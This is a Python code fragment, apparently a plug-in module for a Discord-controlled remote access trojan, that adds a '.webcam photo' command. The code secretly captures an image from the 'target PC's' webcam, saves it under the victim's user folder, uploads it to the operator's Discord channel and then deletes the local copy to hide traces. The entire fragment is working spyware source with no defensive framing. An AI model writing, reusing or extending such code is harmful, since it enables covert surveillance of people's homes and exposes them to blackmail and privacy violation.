import pygame.camera
import pygame.image
import subprocess
import time
# end of imports
# on message
elif message.content[:7] == '.webcam':
    #.log Message is "webcam" 
    await message.delete()
    #.log Removed the message 
    if message.content.strip() == '.webcam':
        #.log Author issued empty ".webcam" command 
        reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```')
        #.log Sent message with usage of ".webcam" 
        await reaction_msg.add_reaction('🔴')
    else:
        if message.content[8:] == 'photo':
            #.log Author requested for a photo from webcam 
            pygame.camera.init()
            #.log Initialized camera with PyGame 
            cameras = pygame.camera.list_cameras()
            #.log Got a list of available cameras 
            if not cameras:
                #.log No cameras found 
                reaction_msg = await message.channel.send('No cameras found.')
                #.log Sent message about missing cameras. Aborting the operation 
                await reaction_msg.add_reaction('🔴')
                return
            camera = pygame.camera.Camera(cameras[0])
            #.log Selected the default camera 
            camera.start()
            time.sleep(1)
            #.log Started camera intercepting 
            image = camera.get_image()
            #.log Took image from camera 
            camera.stop()
            #.log Stopped camera intercepting 
            pygame.image.save(image, f'C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png')
            #.log Saved image from the camera 
            reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time(True) + ' `[On demand]`').set_image(url='attachment://webcam.png'),file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png'))
            #.log Sent embed with image from camera 
            await reaction_msg.add_reaction('📌')
            #.log Reacted with "pin" 
            subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png', shell=True)
            #.log Removed image from camera 
        else:
            #.log Author provided invalid argument for this command 
            reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```')
            #.log Sent message with usage of ".webcam" 
            await reaction_msg.add_reaction('🔴')
